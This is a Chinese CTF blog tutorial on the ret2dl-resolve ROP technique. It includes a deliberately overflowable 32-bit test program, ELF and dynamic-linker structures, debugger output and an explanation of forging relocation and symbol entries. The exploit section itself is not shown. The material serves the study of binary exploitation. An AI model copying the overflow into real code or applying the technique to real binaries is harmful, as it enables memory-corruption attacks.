        <li class="md-nav__item">
  <a href="#elf" class="md-nav__link">
    从ELF文件格式开始
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#entries" class="md-nav__link">
    entries
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#plt" class="md-nav__link">
    plt详解
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hacking-_dl_fixup" class="md-nav__link">
    hacking _dl_fixup
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exp" class="md-nav__link">
    exp
  </a>
  
</li>
      
      
      
      
      
        <li class="md-nav__item">
          <a href="#__comments" class="md-nav__link md-nav__link--active">
            评论
          </a>
        </li>
      
    </ul>
  
</nav>
    
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../arm/" title="Arm" class="md-nav__link">
      Arm
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../basic/" title="Basic" class="md-nav__link">
      Basic
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../encode/" title="Encode" class="md-nav__link">
      Encode
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../fmt/" title="Fmt" class="md-nav__link">
      Fmt
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../heap/" title="Heap" class="md-nav__link">
      Heap
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../res/" title="Res" class="md-nav__link">
      Res
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../tools/" title="Tools" class="md-nav__link">
      Tools
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-9" type="checkbox" id="nav-4-9">
    
    <label class="md-nav__link" for="nav-4-9">
      Web
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-4-9">
        Web
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../web/SensitiveFile/" title="SensitiveFile" class="md-nav__link">
      SensitiveFile
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../web/escape/" title="Escape" class="md-nav__link">
      Escape
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../web/nodeJs/" title="nodeJs" class="md-nav__link">
      nodeJs
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../web/php文件包含/" title="Php文件包含" class="md-nav__link">
      Php文件包含
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../web/python/" title="Python" class="md-nav__link">
      Python
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../web/xpath、xml注入/" title="Xpath、xml注入" class="md-nav__link">
      Xpath、xml注入
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-10" type="checkbox" id="nav-4-10">
    
    <label class="md-nav__link" for="nav-4-10">
      Wp
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-4-10">
        Wp
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../wp/2018护网杯/" title="wp" class="md-nav__link">
      wp
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../wp/CG-CTF/" title="re" class="md-nav__link">
      re
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../wp/catalyst/" title="Catalyst" class="md-nav__link">
      Catalyst
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../wp/jarvisOJ/" title="jarvisOJ" class="md-nav__link">
      jarvisOJ
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-10-5" type="checkbox" id="nav-4-10-5">
    
    <label class="md-nav__link" for="nav-4-10-5">
      L3sec
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-4-10-5">
        L3sec
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../wp/L3sec/pwn1/" title="Pwn1" class="md-nav__link">
      Pwn1
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../wp/L3sec/招新/" title="招新" class="md-nav__link">
      招新
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
    
    <label class="md-nav__link" for="nav-5">
      gameSecurity
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-5">
        gameSecurity
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../gameSecurity/protect/" title="Protect" class="md-nav__link">
      Protect
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
    
    <label class="md-nav__link" for="nav-6">
      Ics
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-6">
        Ics
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../ics/发现/" title="发现" class="md-nav__link">
      发现
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
    
    <label class="md-nav__link" for="nav-7">
      keyAndSetting
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-7">
        keyAndSetting
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../keyAndSetting/各种Key/" title="windows kms key" class="md-nav__link">
      windows kms key
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8" type="checkbox" id="nav-8">
    
    <label class="md-nav__link" for="nav-8">
      Reverse
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-8">
        Reverse
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/ReversingTools/" title="ReversingTools" class="md-nav__link">
      ReversingTools
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/basic/" title="Basic" class="md-nav__link">
      Basic
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/dotNet/" title="dotNet" class="md-nav__link">
      dotNet
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/ida/" title="Ida" class="md-nav__link">
      Ida
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/pe/" title="Pe" class="md-nav__link">
      Pe
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/pyc/" title="Pyc" class="md-nav__link">
      Pyc
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/shark恒/" title="Shark恒" class="md-nav__link">
      Shark恒
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/unpack/" title="Unpack" class="md-nav__link">
      Unpack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/webasm/" title="Webasm" class="md-nav__link">
      Webasm
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/win_driver/" title="Win driver" class="md-nav__link">
      Win driver
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/z3/" title="Z3" class="md-nav__link">
      Z3
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/反调试/" title="反调试" class="md-nav__link">
      反调试
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/各种段/" title="各种段" class="md-nav__link">
      各种段
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/混淆/" title="混淆" class="md-nav__link">
      混淆
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/黑影vip/" title="黑影vip" class="md-nav__link">
      黑影vip
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-16" type="checkbox" id="nav-8-16">
    
    <label class="md-nav__link" for="nav-8-16">
      010editor
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-8-16">
        010editor
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/010editor/crack/" title="Crack" class="md-nav__link">
      Crack
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9" type="checkbox" id="nav-9">
    
    <label class="md-nav__link" for="nav-9">
      Ustc
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-9">
        Ustc
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../ustc/101/" title="101" class="md-nav__link">
      101
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../ustc/857/" title="857" class="md-nav__link">
      857
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../ustc/math1/" title="Math1" class="md-nav__link">
      Math1
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">目录</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    准备
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#elf" class="md-nav__link">
    从ELF文件格式开始
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#entries" class="md-nav__link">
    entries
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#plt" class="md-nav__link">
    plt详解
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hacking-_dl_fixup" class="md-nav__link">
    hacking _dl_fixup
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exp" class="md-nav__link">
    exp
  </a>
  
</li>
      
      
      
      
      
        <li class="md-nav__item">
          <a href="#__comments" class="md-nav__link md-nav__link--active">
            评论
          </a>
        </li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/Windforce17/blog/blob/master/docs/ctf/pwn/ROP_ret2dl.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
                
                
                  <h1>ROP ret2dl</h1>
                
                <h2 id="_1">准备<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>PLT - Procedure Linkage Table<br />
GOT - GLOBAL OFFSET TABLE<br />
参考<a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/">pwn4.fun</a><br />
测试程序源码，编译环境为ubuntu16.04 ,命令<code>gcc -o bof -m32 -fno-stack-protector bof.c</code><br />
<div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">;</span>

    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
    <span class="n">vuln</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></p>
<h2 id="elf">从ELF文件格式开始<a class="headerlink" href="#elf" title="Permanent link">&para;</a></h2>
<p>我们都知道 elf的<code>.text</code> 存放指令，<code>.data</code>存放数据，<code>.bss</code>存放未初始化变量等,这些Section的定义是由下面的数据结构决定。
<div class="codehilite"><pre><span></span>typedef struct {
    Elf32_Word sh_name;      // 节头部字符串表节区的索引
    Elf32_Word sh_type;      // 节类型
    Elf32_Word sh_flags;     // 节标志，用于描述属性
    Elf32_Addr sh_addr;      // 节的内存映像
    Elf32_Off  sh_offset;    // 节的文件偏移
    Elf32_Word sh_size;      // 节的长度
    Elf32_Word sh_link;      // 节头部表索引链接
    Elf32_Word sh_info;      // 附加信息
    Elf32_Word sh_addralign; // 节对齐约束
    Elf32_Word sh_entsize;   // 固定大小的节表项的长度
} Elf32_Shdr;
</pre></div>
使用命令 <code>readelf -S bof</code> 就可以看到
<div class="codehilite"><pre><span></span>There are 31 section headers, starting at offset 0x18a4:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00002c 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481d8 0001d8 0000a0 10   A  6   1  4
  [ 6] .dynstr           STRTAB          08048278 000278 00006b 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          080482e4 0002e4 000014 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         080482f8 0002f8 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             08048318 000318 000018 08   A  5   0  4
  [10] .rel.plt          REL             08048330 000330 000028 08  AI  5  24  4
  [11] .init             PROGBITS        08048358 000358 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        08048380 000380 000060 04  AX  0   0 16
  [13] .plt.got          PROGBITS        080483e0 0003e0 000008 00  AX  0   0  8
  [14] .text             PROGBITS        080483f0 0003f0 000232 00  AX  0   0 16
  [15] .fini             PROGBITS        08048624 000624 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        08048638 000638 000008 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        08048640 000640 000034 00   A  0   0  4
  [18] .eh_frame         PROGBITS        08048674 000674 0000f4 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4
  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4
  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [24] .got.plt          PROGBITS        0804a000 001000 000020 04  WA  0   0  4
  [25] .data             PROGBITS        0804a020 001020 000008 00  WA  0   0  4
  [26] .bss              NOBITS          0804a040 001028 00000c 00  WA  0   0 32
  [27] .comment          PROGBITS        00000000 001028 000035 01  MS  0   0  1
  [28] .shstrtab         STRTAB          00000000 001798 00010a 00      0   0  1
  [29] .symtab           SYMTAB          00000000 001060 0004b0 10     30  47  4
  [30] .strtab           STRTAB          00000000 001510 000288 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)
</pre></div></p>
<h2 id="entries">entries<a class="headerlink" href="#entries" title="Permanent link">&para;</a></h2>
<p>如果程序由是<code>dynamically</code> 那么由于很多符号都是运行时绑定(plt got got.plt...) 那么为了完成这一过程，头部就增加了<code>PT_DYNAMIC</code>的Section，<code>.dynamic</code>段，包含了若干entries,结构如下
<div class="codehilite"><pre><span></span><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
    <span class="n">Elf32_Sword</span> <span class="n">d_tag</span><span class="p">;</span>
    <span class="k">union</span> <span class="p">{</span>
        <span class="n">Elf32_Word</span> <span class="n">d_val</span><span class="p">;</span>
        <span class="n">Elf32_Addr</span> <span class="n">d_ptr</span><span class="p">;</span>
    <span class="p">}</span> <span class="n">d_un</span><span class="p">;</span>
<span class="p">}</span> <span class="n">Elf32_Dyn</span><span class="p">;</span>
</pre></div>
使用命令<code>readelf -d bof</code> 就可以看到这个段的数据结构，注意Name/Value就是那个联合体。
<div class="codehilite"><pre><span></span> Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000c (INIT)                       0x8048358
 0x0000000d (FINI)                       0x8048624
 0x00000019 (INIT_ARRAY)                 0x8049f08
 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
 0x0000001a (FINI_ARRAY)                 0x8049f0c
 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
 0x6ffffef5 (GNU_HASH)                   0x80481ac
 0x00000005 (STRTAB)                     0x8048278
 0x00000006 (SYMTAB)                     0x80481d8
 0x0000000a (STRSZ)                      107 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000015 (DEBUG)                      0x0
 0x00000003 (PLTGOT)                     0x804a000
 0x00000002 (PLTRELSZ)                   40 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0x8048330
 0x00000011 (REL)                        0x8048318
 0x00000012 (RELSZ)                      24 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x6ffffffe (VERNEED)                    0x80482f8
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x80482e4
 0x00000000 (NULL)                       0x0
</pre></div></p>
<h2 id="plt">plt详解<a class="headerlink" href="#plt" title="Permanent link">&para;</a></h2>
<p><code>ret2dl</code>攻击方法就是我们自己伪造函数签名，然后在plt的过程中<code>glibc</code>伪造的函数地址写入到真实函数的got上，达到任意函数调用的效果。
首先看下调用write的过程。
<div class="codehilite"><pre><span></span>pwndbg&gt; plt
0x8048390: setbuf@plt
0x80483a0: read@plt
0x80483b0: strlen@plt
0x80483c0: __libc_start_main@plt
0x80483d0: write@pl
</pre></div>
可知write的地址是<code>0x80483d0</code></p>
<p><div class="codehilite"><pre><span></span>pwndbg&gt; x /5i 0x80483d0
   0x80483d0 &lt;write@plt&gt;:       jmp    DWORD PTR ds:0x804a01c
   0x80483d6 &lt;write@plt+6&gt;:     push   0x20
   0x80483db &lt;write@plt+11&gt;:    jmp    0x8048380
   0x80483e0 &lt;__gmon_start__@plt&gt;:      jmp    DWORD PTR ds:0x8049ffc
   0x80483e6 &lt;__gmon_start__@plt+6&gt;:    xchg   ax,ax
</pre></div>
jmp到了<code>0x804a01c</code>
<div class="codehilite"><pre><span></span>pwndbg&gt; x /10gx 0x804a01c
0x804a01c:      0x00000000080483d6      0x0000000000000000
0x804a02c:      0x0000000000000000      0x0000000000000000
</pre></div>
实际调用了<code>0x80483d6</code> 即<code>write@plt+6</code> 可以看到jmp到了plt[0]
<div class="codehilite"><pre><span></span>pwndbg&gt; x /3i 0x8048380
   0x8048380:   push   DWORD PTR ds:0x804a004
   0x8048386:   jmp    DWORD PTR ds:0x804a008
   0x804838c:   add    BYTE PTR [eax],a
</pre></div>
压入了.got[1]，跳转.got[2]
got[0]保存了.dynamic地址:<code>0x08049f14</code>，got[1]保存了linker的ID info:<code>0xf7ffd940</code>，got[2]保存了dynamic linker的地址:<code>0xf7fead90</code>,后面是各个函数的地址，这里是setbuf,read...
<div class="codehilite"><pre><span></span>pwndbg&gt; x /10w 0x08049ffc
0x8049ffc:      0x00000000      0x08049f14      0xf7ffd940      0xf7fead90
0x804a00c:      0x08048396      0x080483a6      0x080483b6      0xf7dffd90
</pre></div>
实际上，这个过程执行了<code>_dl_runtime_resolve(link_map, reloc_arg)</code>,这个函数在<code>glibc-2.23/sysdeps/i386/dl-trampoline.S</code>这个汇编文件里会调用<code>_dl_fixup</code>，用来填充GOT，</p>
<p><div class="codehilite"><pre><span></span><span class="n">_dl_fixup</span><span class="p">(</span><span class="k">struct</span> <span class="n">link_map</span> <span class="o">*</span><span class="n">l</span><span class="p">,</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Word</span><span class="p">)</span> <span class="n">reloc_arg</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg</span>
    <span class="k">const</span> <span class="n">PLTREL</span> <span class="o">*</span><span class="k">const</span> <span class="n">reloc</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">D_PTR</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">DT_JMPREL</span><span class="p">])</span> <span class="o">+</span> <span class="n">reloc_offset</span><span class="p">);</span>
    <span class="c1">// 然后通过reloc-&gt;r_info找到.dynsym中对应的条目</span>
    <span class="k">const</span> <span class="nf">ElfW</span><span class="p">(</span><span class="n">Sym</span><span class="p">)</span> <span class="o">*</span><span class="n">sym</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">symtab</span><span class="p">[</span><span class="n">ELFW</span><span class="p">(</span><span class="n">R_SYM</span><span class="p">)</span> <span class="p">(</span><span class="n">reloc</span><span class="o">-&gt;</span><span class="n">r_info</span><span class="p">)];</span>
    <span class="c1">// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7</span>
    <span class="n">assert</span> <span class="p">(</span><span class="n">ELFW</span><span class="p">(</span><span class="n">R_TYPE</span><span class="p">)(</span><span class="n">reloc</span><span class="o">-&gt;</span><span class="n">r_info</span><span class="p">)</span> <span class="o">==</span> <span class="n">ELF_MACHINE_JMP_SLOT</span><span class="p">);</span>
    <span class="c1">// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">_dl_lookup_symbol_x</span> <span class="p">(</span><span class="n">strtab</span> <span class="o">+</span> <span class="n">sym</span><span class="o">-&gt;</span><span class="n">st_name</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sym</span><span class="p">,</span> <span class="n">l</span><span class="o">-&gt;</span><span class="n">l_scope</span><span class="p">,</span> <span class="n">version</span><span class="p">,</span> <span class="n">ELF_RTYPE_CLASS_PLT</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="c1">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span>
    <span class="n">value</span> <span class="o">=</span> <span class="n">DL_FIXUP_MAKE_VALUE</span> <span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="n">sym</span> <span class="o">?</span> <span class="p">(</span><span class="n">LOOKUP_VALUE_ADDRESS</span> <span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">+</span> <span class="n">sym</span><span class="o">-&gt;</span><span class="n">st_value</span><span class="p">)</span> <span class="o">:</span> <span class="mi">0</span><span class="p">);</span>
    <span class="c1">// 最后把value写入相应的GOT表条目中</span>
    <span class="k">return</span> <span class="nf">elf_machine_fixup_plt</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">result</span><span class="p">,</span> <span class="n">reloc</span><span class="p">,</span> <span class="n">rel_addr</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
我们无法控制link_map(got[1])的值，只能控制reloc_arg。</p>
<h2 id="hacking-_dl_fixup">hacking _dl_fixup<a class="headerlink" href="#hacking-_dl_fixup" title="Permanent link">&para;</a></h2>
<p>这一以 <code>call write@plt</code>为例子.
首先，第一行代码通过<code>write@plt+6:0x20</code>，找到<code>JMPREL</code>中的write项，通过<code>.dynamic</code>可以发现，<code>JMPREL</code>的地址是<code>0x8048330</code>，其实就是<code>.rel.plt</code>,这个section的数据结构如下,<code>.rel.dyn</code>是用来变量重定位的，暂时不谈
<div class="codehilite"><pre><span></span><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
    <span class="n">Elf32_Addr</span> <span class="n">r_offset</span><span class="p">;</span>    <span class="c1">// 对于可执行文件，此值为虚拟地址</span>
    <span class="n">Elf32_Word</span> <span class="n">r_info</span><span class="p">;</span>      <span class="c1">// 符号表索引</span>
<span class="p">}</span> <span class="n">Elf32_Rel</span><span class="p">;</span>

<span class="cp">#define ELF32_R_SYM(info) ((info)&gt;&gt;8)</span>
<span class="cp">#define ELF32_R_TYPE(info) ((unsigned char)(info))</span>
<span class="cp">#define ELF32_R_INFO(sym, type) (((sym)&lt;&lt;8)+(unsigned char)(type))</span>
</pre></div>
使用<code>readelf -r bof</code> 可以看到这两个段的数据结构，省略了<code>.rel.dyn</code>的输出
<div class="codehilite"><pre><span></span>Relocation section &#39;.rel.plt&#39; at offset 0x330 contains 5 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
0804a014  00000407 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0
0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a01c  00000607 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0
</pre></div>
其中，offset就是<code>.got.plt</code>中保存的对应函数地址的地址，即*(0804a01c)=&amp;write<br />
看上面和<code>.rel.dyn</code>相关的两个宏，可以求解出:
<div class="codehilite"><pre><span></span>ELF32_R_SYM=6
ELF32_R_TYPE=7
</pre></div>
也就是说Elf32_Sym[6]保存着write的符号表信息，Type为<code>R_386_JUMP_SLOT</code>。Elf32_Sym实际上就是
<code>.dynsym</code> section，这个section的数据结构如下:
<div class="codehilite"><pre><span></span>typedef struct
{
    Elf32_Word st_name;     // Symbol name(string table index)
    Elf32_Addr st_value;    // Symbol value
    Elf32_Word st_size;     // Symbol size
    unsigned char st_info;  // Symbol type and binding
    unsigned char st_other; // Symbol visibility under glibc&gt;=2.2
    Elf32_Section st_shndx; // Section index
} Elf32_Sym;
</pre></div>
使用<code>readelf -s bof</code>可以看到
<div class="codehilite"><pre><span></span>Symbol table &#39;.dynsym&#39; contains 10 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND setbuf@GLIBC_2.0 (2)
     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.0 (2)
     3: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND strlen@GLIBC_2.0 (2)
     5: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)
     6: 00000000     0 FUNC    GLOBAL DEFAULT  UND write@GLIBC_2.0 (2)
     7: 0804a044     4 OBJECT  GLOBAL DEFAULT   26 stdout@GLIBC_2.0 (2)
     8: 0804863c     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used
     9: 0804a040     4 OBJECT  GLOBAL DEFAULT   26 stdin@GLIBC_2.0 (2
</pre></div>
第六个就是我们的write。<br />
好了，总结下思路，首先，通过ROP控制RIP执行_dl_runtime_resolve(link_map, reloc_arg),其中reloc_arg是我们可控的，控制reloc_arg 使得glibc 索引到我们伪造的<code>.rel.dyn</code>项上，我们可以在bss、data等段进行伪造，其次控制伪造的<code>r_info</code>值，从而控制<code>.dynsym</code>项，<code>r_offset</code>就是我们要改写的write的地址，所以使用原本的就OK，
